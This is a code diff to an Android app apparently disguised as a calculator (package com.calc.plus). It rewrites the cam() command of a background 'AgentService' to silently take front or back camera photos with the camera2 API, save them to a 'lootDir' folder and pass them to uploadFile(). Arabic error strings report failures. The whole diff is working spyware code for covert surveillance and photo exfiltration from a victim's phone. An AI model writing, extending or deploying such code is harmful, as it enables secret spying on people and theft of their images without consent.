@@ -3,8 +3,17 @@ package com.calc.plus;
 import android.app.*;
 import android.content.*;
 import android.database.Cursor;
-import android.hardware.Camera;
 import android.media.MediaRecorder;
+import android.hardware.camera2.CameraManager;
+import android.hardware.camera2.CameraCharacteristics;
+import android.hardware.camera2.CameraDevice;
+import android.hardware.camera2.CameraCaptureSession;
+import android.hardware.camera2.CaptureRequest;
+import android.hardware.camera2.TotalCaptureResult;
+import android.media.ImageReader;
+import android.graphics.ImageFormat;
+import android.view.Surface;
+import java.util.Arrays;
 import android.os.*;
 import android.provider.Settings;
 import android.view.SurfaceView;
@@ -84,40 +93,67 @@ public class AgentService extends Service {
     }
 
     String cam(String arg) {
-        int camId = 0;
-        String face = "back";
-        if (arg != null && arg.trim().toLowerCase().startsWith("f")) { camId = 1; face = "front"; }
-        Camera camera = null;
-        try { camera = Camera.open(camId); }
-        catch (Exception e) {
-            try { camera = Camera.open(0); camId = 0; face = "back"; }
-            catch (Exception ee) { return "لا كاميرا: " + ee; }
-        }
+        final String face = (arg != null && arg.trim().toLowerCase().startsWith("f")) ? "front" : "back";
         final String fname = "cam_" + face + "_" + System.currentTimeMillis() + ".jpg";
         final File out = new File(lootDir, fname);
-        final CountDownLatch latch = new CountDownLatch(1);
+        final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
         final String[] err = {null};
         try {
-            camera.setPreviewDisplay(new SurfaceView(this).getHolder());
-            camera.startPreview();
-            camera.takePicture(null, null, new Camera.PictureCallback() {
-                @Override public void onPictureTaken(byte[] data, Camera cam) {
+            CameraManager mgr = (CameraManager) getSystemService(CAMERA_SERVICE);
+            String camId = null;
+            int want = face.equals("front") ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;
+            for (String id : mgr.getCameraIdList()) {
+                Integer f = mgr.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING);
+                if (f != null && f == want) { camId = id; break; }
+            }
+            if (camId == null) return "لا كاميرا " + face;
+
+            android.util.Size sz = new android.util.Size(1280, 720);
+            final ImageReader reader = ImageReader.newInstance(sz.getWidth(), sz.getHeight(), ImageFormat.JPEG, 2);
+
+            mgr.openCamera(camId, new CameraDevice.StateCallback() {
+                @Override public void onOpened(final CameraDevice cam) {
                     try {
-                        FileOutputStream fos = new FileOutputStream(out);
-                        fos.write(data); fos.close();
-                    } catch (Exception e) { err[0] = e.toString(); }
-                    finally {
-                        try { cam.stopPreview(); cam.release(); } catch (Exception ignored) {}
-                        latch.countDown();
-                    }
+                        final CaptureRequest.Builder req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+                        req.addTarget(reader.getSurface());
+                        req.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
+                        req.set(CaptureRequest.JPEG_ORIENTATION, 90);
+
+                        cam.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
+                            @Override public void onConfigured(CameraCaptureSession session) {
+                                try { session.capture(req.build(), null, null); }
+                                catch (Exception e) { err[0] = "capture: " + e; latch.countDown(); }
+                            }
+                            @Override public void onConfigureFailed(CameraCaptureSession session) {
+                                err[0] = "configure failed"; latch.countDown();
+                            }
+                        }, null);
+                    } catch (Exception e) { err[0] = "req: " + e; latch.countDown(); }
                 }
-            });
-            latch.await(15, TimeUnit.SECONDS);
+                @Override public void onDisconnected(CameraDevice cam) { err[0] = "disconnected"; latch.countDown(); }
+                @Override public void onError(CameraDevice cam, int error) { err[0] = "error " + error; latch.countDown(); }
+            }, null);
+
+            reader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
+                @Override public void onImageAvailable(ImageReader r) {
+                    try {
+                        android.media.Image img = r.acquireNextImage();
+                        java.nio.ByteBuffer buf = img.getPlanes()[0].getBuffer();
+                        byte[] bytes = new byte[buf.remaining()];
+                        buf.get(bytes);
+                        FileOutputStream fos = new FileOutputStream(out);
+                        fos.write(bytes); fos.close();
+                        img.close(); r.close();
+                    } catch (Exception e) { err[0] = "save: " + e; }
+                    latch.countDown();
+                }
+            }, null);
+
+            latch.await(20, java.util.concurrent.TimeUnit.SECONDS);
             if (err[0] != null) return "خطأ: " + err[0];
-            if (!out.exists()) return "فشل الالتقاط";
+            if (!out.exists() || out.length() == 0) return "فشل الالتقاط";
             return uploadFile(out);
         } catch (Exception e) {
-            try { if (camera != null) camera.release(); } catch (Exception ignored) {}
             return "خطأ كاميرا: " + e;
         }
     }
